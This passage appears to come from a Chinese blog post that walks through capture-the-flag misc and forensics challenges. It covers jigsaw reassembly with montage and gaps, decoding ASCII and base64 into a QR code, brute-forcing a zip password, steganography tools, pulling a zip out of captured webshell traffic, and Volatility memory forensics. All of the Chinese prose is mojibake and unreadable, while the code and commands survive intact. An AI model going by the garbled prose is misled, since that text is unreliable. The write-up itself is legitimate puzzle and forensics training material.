alt="image-20220118152247852"><br>æ˜¾ç„¶è¿™é‡Œbase64è½¬ä¸€ä¸‹secretå†…å®¹pkå¼€å¤´æ˜¯ä¸€ä¸ªzipåŒ…ï¼Œæˆ‘ä»¬ä¿å­˜ä¸‹æ¥ï¼Œæ”¹ä¸€ä¸‹åç¼€ï¼Œè§£å‹ä¸€ä¸‹é‡Œé¢æ˜¯å¾ˆå¤šå›¾ç‰‡ï¼Œæ‹¼å›¾ï¼Œå†çœ‹ä¸€ä¸‹hint.txt,<br><img src="/images/changanzhanyi/6.png" alt="image-20220118152825786"><br>base32çš„æç¤ºï¼Œç„¶åå°±å¯ä»¥æ„‰å¿«çš„æ‹¼å›¾äº†ã€‚<br>æ‰‹å·¥æ‹¼å›¾å¾ˆç´¯ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨å·¥å…·<br><img src="/images/changanzhanyi/7.png" alt="image-20220118154452731"><br><img src="/images/changanzhanyi/8.png" alt="image-20220118154522615"><br>å…ˆçœ‹ä¸‹ä¿¡æ¯ï¼Œæ¯ä¸ªå°å›¾ç‰‡éƒ½æ˜¯100*100çš„æ€»å…±49ä¸ªé¡¹ç›®ï¼Œå»æ‰dsstore è¿˜å‰©48ä¸ªï¼Œå¯èƒ½æ˜¯6x8çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯4x12ï¼Œè¿™é‡Œç”¨4x12çš„ æŠŠæ‰€æœ‰çš„å°å›¾ç‰‡ç”¨<code>montage</code>æ‹¼æˆä¸€ä¸ªå¤§å›¾ç‰‡ï¼Œç„¶åç”¨<code>gaps</code>è¿›è¡Œè¿˜åŸ<br><code>montage *png -tile 12x4 -geometry 100x100+0+0 out.png</code><br>-tileæ˜¯æ‹¼æ¥æ—¶æ¯è¡Œå’Œæ¯åˆ—çš„å›¾ç‰‡æ•°ã€‚è¿™é‡Œç”¨12x4ï¼Œå°±æ˜¯12åˆ—4è¡Œï¼Œä¹Ÿå°±æ˜¯é•¿12å¼ å›¾ç‰‡é«˜4å¼ <br>-geometryæ˜¯æ¯ä¸ªå°å›¾ç‰‡çš„åƒç´ ï¼Œåé¢çš„+0+0æ˜¯è¾¹æ¡†æ˜¯0ï¼Œ<br><img src="/images/changanzhanyi/9.png" alt="image-20220118160159420"><br>æ‹¼æˆä¸€ä¸ªå¤§å›¾ç‰‡åï¼Œç›´æ¥ç”¨gaps,æˆ‘ä»¬ä¸èƒ½ç¡®å®šgenerationsï¼Œå¯ä»¥åŠ ä¸ªversionï¼Œå®ƒå¯ä»¥ä¸€ä¸ªä¸ªæ˜¾ç¤ºï¼Œå¤šè¿è¡Œå‡ éï¼Œä¸­é—´çœ‹é‚£ä¸ªæ¸…æ¥šï¼Œæˆªå›¾å°±å¯ä»¥äº†<br><code>gaps --image=out1.png --generations=100 --population=48 --size=100 --verbose</code><br>â€“image            æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„<br>â€“size            æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸<br>â€“generations    é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡<br>â€“population    ä¸ªä½“æ•°é‡<br>â€“verbose        æ¯ä¸€ä»£è®­ç»ƒç»“æŸåå±•ç¤ºæœ€ä½³ç»“æœ<br>â€“save            å°†æ‹¼å›¾è¿˜åŸä¸ºå›¾åƒ<br><img src="/images/changanzhanyi/10.png" alt="image-20220118161022716"></p><h5 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h5><p>ä¸‹è½½é™„ä»¶åï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶fileä¸€ä¸‹<br><img src="/images/changanzhanyi/11.png" alt="image-20220118171304054"><br>æ˜¯ä¸€ä¸ªclassæ–‡ä»¶ï¼Œæœæ–­æ”¹æˆ.classåæ‹–åˆ°jd-guié‡Œï¼Œçœ‹èµ·æ¥åƒæ˜¯ascciiï¼Œå¾ˆé•¿ï¼Œè„šæœ¬<br><img src="/images/changanzhanyi/12.png" alt="image-20220118171417093"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&quot;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(chr(int(i)),end=&#x27;&#x27;)</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==&quot;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>0101çš„ç»„åˆï¼Œé•¿å’Œå®½éƒ½æ˜¯37ä½ï¼Œæœæ–­çŒœä¸€ä¸‹è½¬äºŒç»´ç ï¼Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x = <span class="number">37</span>   <span class="comment">#æ³¨æ„è¿™é‡Œä¸€å®šè¦çœ‹ä¸€ä¸‹é«˜åº¦å’Œå®½åº¦</span></span><br><span class="line">y = <span class="number">37</span></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (x, y))</span><br><span class="line">white = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">black = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\python\\misc\\key.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        ff = f.readline()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            <span class="keyword">if</span> ff[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                im.putpixel((i, j), black)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                im.putpixel((i, j), white)</span><br><span class="line">im.save(<span class="string">&quot;D:\\vscodework\\python\\misc\\1.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/changanzhanyi/13.png" alt="image-20220118172445205"></p><h5 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h5><p>ä¸‹è½½é™„ä»¶ï¼Œè§£å‹ä¸€ä¸‹æœ‰å¯†ç ï¼Œæœ‰æ³¨é‡Šï¼Œå…­ä¸ªæ•°å­—<br><img src="/images/changanzhanyi/14.png" alt="image-20220118202827001"><br>çˆ†ç ´ä¸€ä¸‹å¯†ç 220101<br><img src="/images/changanzhanyi/15.png" alt="image-20220118202926688"><br>ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªemjioè¡¨æƒ…ï¼Œç†è®ºä¸Šæ¥è¯´æ˜¯emjioåŠ å¯†ï¼Œä¸€ä¸ªpycæ–‡ä»¶ï¼Œåç¼–è¯‘å‡ºæ¥  æ²¡å•¥ç”¨ï¼Œå°±ä¸ä¼šäº†<br>åæ¥çœ‹å¤§å¸ˆå‚…çš„wpï¼Œæ˜¯å‰‘é¾™åŠ å¯†ï¼Œ<code>https://github.com/AngelKitty/stegosaurus</code><br><img src="/images/changanzhanyi/16.png" alt="image-20220118204451068">æ¥ä¸€ä¸‹æœ‰ä¸ªkey<br>æ‹¿å»emjioè§£å¯†<code>https://aghorler.github.io/emoji-ae</code><br><img src="/images/changanzhanyi/17.png" alt="image-20220118204700866"><br><img src="/images/changanzhanyi/18.png" alt="image-20220118204716886"></p><h5 id="æ— å­—å¤©ä¹¦"><a href="#æ— å­—å¤©ä¹¦" class="headerlink" title="æ— å­—å¤©ä¹¦"></a>æ— å­—å¤©ä¹¦</h5><p>æ‹¿åˆ°é™„ä»¶è§£å‹ä¸€ä¸‹ï¼Œè¿‡æ»¤httpå’Œ1.php 1.phpæ˜¯ä¸ªå†°èçš„é©¬å­<br>æœ‰ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„æ“ä½œï¼Œè¿½è¸ªhttpæµï¼Œä¸‹é¢<code>504b0304</code>æ˜¯zip16è¿›åˆ¶å¤´<br><img src="/images/changanzhanyi/19.png" alt="image-20220119144025872"><br><img src="/images/changanzhanyi/20.png" alt="image-20220119144107117"><br>å¤åˆ¶å‡ºæ¥ç”¨winhexåšä¸€ä¸ªï¼Œè§£å‹æ˜¯ä¸¤ä¸ªæ–‡ä»¶<code>.ws</code>æ–‡ä»¶æ˜¯whitespaceåŠ å¯†ï¼Œè§£å¯†ä¸€ä¸‹ï¼Œæ˜¯å¯†ç ï¼Œåœ¨çº¿ç½‘å€<code>http://vii5ard.github.io/whitespace/</code><br><img src="/images/changanzhanyi/21.png" alt="image-20220119150500514"><br><img src="/images/changanzhanyi/22.png" alt="image-20220119144904711"><br><code>XiAnWillBeSafe</code><br>ç„¶åæ˜¯snowåŠ å¯†ï¼Œé¡¹ç›®åœ°å€åœ¨ä¸‹é¢ï¼Œè§£å¯†ä¸€ä¸‹å°±å‡ºäº†<br><img src="/images/changanzhanyi/23.png" alt="image-20220119150041048"><br><code>http://www.darkside.com.au/snow/</code></p><h5 id="æœ´å®æ— åçš„å–è¯"><a href="#æœ´å®æ— åçš„å–è¯" class="headerlink" title="æœ´å®æ— åçš„å–è¯"></a>æœ´å®æ— åçš„å–è¯</h5><p>æ‹¿åˆ°æ–‡ä»¶å…ˆçœ‹ä¸€ä¸‹é•œåƒç³»ç»Ÿä¿¡æ¯<br><code>python2 vol.py -f xp_sp3.raw imageinfo</code><br><img src="/images/changanzhanyi/24.png" alt="image-20220120160029257"><br>æ˜¯winxpsp2x86,çœ‹ä¸‹fileï¼Œä¸€èˆ¬filescanç»™å‡ºçš„ä¿¡æ¯å¤ªå¤šäº†ï¼Œé¢˜ç›®å¦‚æœç»™æç¤ºçš„è¯ï¼Œä¸€èˆ¬grepä¸‹æç¤ºï¼Œä¸ç»™çš„è¯grepflag<br><code>python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 filescan | grep &#39;flag&#39;</code><br><img src="/images/changanzhanyi/25.png" 